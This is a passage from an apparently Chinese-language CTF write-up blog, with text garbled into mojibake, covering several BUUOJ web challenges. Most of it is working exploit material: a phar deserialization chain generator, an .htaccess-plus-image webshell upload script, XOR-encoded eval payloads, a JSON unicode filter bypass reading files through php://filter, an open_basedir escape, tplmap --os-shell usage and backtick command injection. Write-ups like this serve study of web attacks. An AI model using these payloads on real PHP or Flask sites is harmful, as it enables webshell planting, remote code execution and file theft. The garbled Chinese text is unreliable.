file_get()</p><p>æ€ä¹ˆè§¦å‘ <code>__get </code>æ–¹æ³•ï¼Ÿ å¯ä»¥åœ¨ Show::__toString è¿™é‡Œç”¨åˆ°ï¼ŒåŸå§‹æ˜¯å¦‚æœæˆ‘ä»¬ç»™strä¸€ä¸ªå®ä¾‹åŒ–çš„Testç±»ï¼ŒTeståœ¨æ‰¾sourceè¿™ä¸ªæˆå‘˜å˜é‡å°±ä¼šæ‰¾ä¸åˆ°è‡ªç„¶å°±ä¼šè§¦å‘<code>__get</code>æ–¹æ³•ï¼Œå…¶å®å¤§æ¦‚ä¹Ÿæœ‰ä¸ªè§„å¾‹äº†ä¸€èˆ¬ $this-&gt;xxx-&gt;yyy è¿™ç§éƒ½æ˜¯ä¸€çœ¼<code>__get </code> æ–¹æ³• <code>Show::__toString</code> =&gt; <code> Test::__get</code> =&gt; Test::get() =&gt; Test::file_get()</p><p>åœ¨å¾€ä¸Šçœ‹  C1e4r è¿™ä¸ªç±»è¿˜æ²¡æœ‰ç”¨è¿‡ï¼Œå®ƒçš„ææ„å‡½æ•°æœ‰echoç±»æˆå‘˜å˜é‡æ“ä½œï¼Œå¯ä»¥è§¦å‘<code>__toString </code>æ–¹æ³•ï¼Œé‚£ä¹ˆæ€è·¯å·²ç»å¾ˆæ¸…æ™°äº†<code> C1e4r::__destruct</code> </p><p>=&gt; <code>Show::__toString</code> =&gt; <code> Test::__get</code> =&gt; Test::get() =&gt; Test::file_get()</p><p>æ„å»ºexp ç„¶åè®°å¾—æŠŠåç¼€æ”¹æˆ.gif æˆ–è€…å…¶ä»–å¯æ¥å—å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> C1e4r();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Show();<br><br><span class="hljs-variable">$b</span>-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;  <span class="hljs-comment">//flag</span><br><span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-variable">$c</span>;   <br><span class="hljs-variable">$c</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = <span class="hljs-variable">$b</span>;  <br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//ç”Ÿæˆpharæ–‡ä»¶</span><br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);  <span class="hljs-comment">//æ¨™èªŒä½</span><br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>);   <span class="hljs-comment">//å­˜å…¥C1e4rç±»</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);  <span class="hljs-comment">//ç”Ÿæˆç­¾å</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ç„¶åæ ¹æ® function.php çš„è¿™å¥è¯ <code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </code></p><p>æ‰¾æˆ‘ä»¬çš„æ–‡ä»¶ <code>php -r &quot;echo(md5(&#39;phar.gif10.244.80.46&#39;));&quot;</code> </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271936865.png" alt="image-20220127193641797"></p><p>ç„¶åæ¥åˆ°file.php åˆ©ç”¨pharåè®®å³å¯ è§£ç å³æ˜¯flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271937910.png" alt="image-20220127193744830"></p><h2 id="WUST-CTF2020-CV-Maker"><a href="#WUST-CTF2020-CV-Maker" class="headerlink" title="[WUST-CTF2020]CV Maker"></a>[WUST-CTF2020]CV Maker</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271941999.png" alt="image-20220127194137581"></p><p>æ³¨å†Œè´¦å·ç™»å½•åå‘ç°å¯ä»¥ä¸Šä¼ å¤´åƒ é‚£å°±æ˜¯ hta+å›¾ç‰‡é©¬ æ³¨æ„htaä¹Ÿè¦åŠ ä¸ŠGIF89a æ¥è¿‡ exif_imagetype</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271946399.png" alt="image-20220127194658281"></p><p>flagåå­—æœ‰ç‚¹å¥‡ç‰¹</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201271951013.png" alt="image-20220127195130951"></p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>é¢ï¼Œè¿™é¢˜ç¯å¢ƒä¸€ç›´å¯åŠ¨ä¸äº†</p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  show_source(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$json</span> = json_decode(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">if</span> (is_valid(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$page</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !is_valid(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = preg_replace(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> json_encode([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œis_validåªå¯¹åŸå§‹æ•°æ®åšæ­£åˆ™ï¼ŒåŒæ—¶åœ¨ \uxxx åœ¨jsonä¸­ä»£ç è½¬ä¹‰  å­—ç¬¦  å³  php = <code>\u0070\u0068\u0070</code></p><p>å› ä¸ºè¿™é‡Œå¯¹è¯»å–çš„å†…å®¹ä¹Ÿåšäº†åŒ¹é…æ‰€ä»¥ç¼–ç è¾“å‡º</p><p><code>&#123;&quot;page&quot;:&quot;php://filter/convert.base64-encode/resource=/flag&quot;&#125;</code> =&gt;</p><p><code>&#123;&quot;page&quot;:&quot;\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006C\u0061\u0067&quot;&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201272048334.png" alt="image-20220127204858214"></p><p>å³è¾¹å†…å®¹bs64decodeå³å¯</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$userdir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = substr(<span class="hljs-variable">$name</span>, strrpos(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==<span class="hljs-literal">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!exif_imagetype(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        print_r(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = count_chars(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹phpinfo,ç›´æ¥ç”¨ä½¬çš„payload </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?_=$&#123;<span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span>ff<span class="hljs-meta">%</span>ff^<span class="hljs-meta">%</span>a<span class="hljs-number">0</span><span class="hljs-meta">%</span>b<span class="hljs-number">8</span><span class="hljs-meta">%</span>ba<span class="hljs-meta">%</span>ab&#125;&#123;<span class="hljs-meta">%</span>ff&#125;<span class="hljs-comment">()</span>;&amp;<span class="hljs-meta">%</span>ff=phpi<span class="hljs-symbol">nfo</span><br></code></pre></td></tr></table></figure><p>phpinfoé‡Œå°±æœ‰flag ä½†æ˜¯å¤§å®¶è¿˜æœ‰æ›´å¤šçš„æ´»å„¿</p><p>å¯ä»¥åˆ©ç”¨get_the_flag()æ¥æ”¶ä¸Šä¼ æ–‡ä»¶ å¯¹äºexif_imagetypeå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼æ¥ç»•è¿‡</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> height 1337 </span><br></code></pre></td></tr></table></figure><p>å¯¹äº &lt;? è¢«è¿‡æ»¤ è¿™é‡Œhtaccess å¯é€šè¿‡ä¼ªåè®®æ–¹å¼ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ]">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;<br></code></pre></td></tr></table></figure><p>ç„¶åæ¶æ„åœ¨å’Œ shell.aaa</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF89aaa</span>#è¿™é‡Œéœ€è¦è¡¥å……ä½æ•°æ»¡è¶³<span class="hljs-number">8</span>ä½ æ»¡è¶³<span class="hljs-number">4</span>çš„å€æ•°<br><span class="hljs-attribute">PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs</span>/Pg==<br></code></pre></td></tr></table></figure><p>éœ€è¦å‘é€ .htaccess å’Œ webshell äºæ˜¯æœ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;http://46ad8e0d-a3be-4fd2-bb3d-5ae6505ff026.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span><br><br>htaccess = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">#define width 1000</span><br><span class="hljs-string">#define height 1000 </span><br><span class="hljs-string">AddType application/x-httpd-php .aaa</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>shell = <span class="hljs-string">b&quot;GIF89aaa&quot;</span> + base64.b64encode(<span class="hljs-string">b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;</span>)<br><br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br><br>response = requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(response.text)<br><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;shell.aaa&#x27;</span>,shell,<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>response = requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282207646.png" alt="image-20220128220709522"></p><p>æ ¹æ®ä¹‹å‰çš„è·¯å¾„è®¿é—® æˆåŠŸæ‰§è¡Œphpinfoä½†æ˜¯å´æ‰§è¡Œä¸äº†å‘½ä»¤</p><p>ç›´æ¥ä¸‡èƒ½çš„æ’ä»¶å³å¯</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282209469.png" alt="image-20220128220910391"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡ chdiræ¥bypass open_basedir</p><p>è¿˜æ˜¯åˆšåˆšæ‰§è¡Œphpinfoçš„é¡µé¢ postå¦‚ä¸‹å‚æ•°</p><p><code>cmd=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></p><p><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;));</code></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>tplmap ä¸€æŠŠæ¢­</p><p><code>./tplmap.py -u &quot;http://6ba075ff-932c-4ca5-a80a-a7351954182f.node4.buuoj.cn:81/?name=1&quot;  --os-shell</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201272134734.png" alt="image-20220127213413628"></p><h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥çŸ­æ ‡ç­¾ + åå¼•å·å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`ls%<span class="hljs-number">09</span>/`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå…ˆçœ‹æ²™ç›’è·¯å¾„ <code>?action=pwd</code></p><p>ç„¶å ä¼ å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">action=upload&amp;data=<span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`ls%<span class="hljs-number">09</span>/`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°æ ¹ç›®å½•å­˜åœ¨ /flllllll1112222222lag </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>action=upload&amp;data=<span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`cat%<span class="hljs-number">09</span>/flllllll1112222222lag`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" 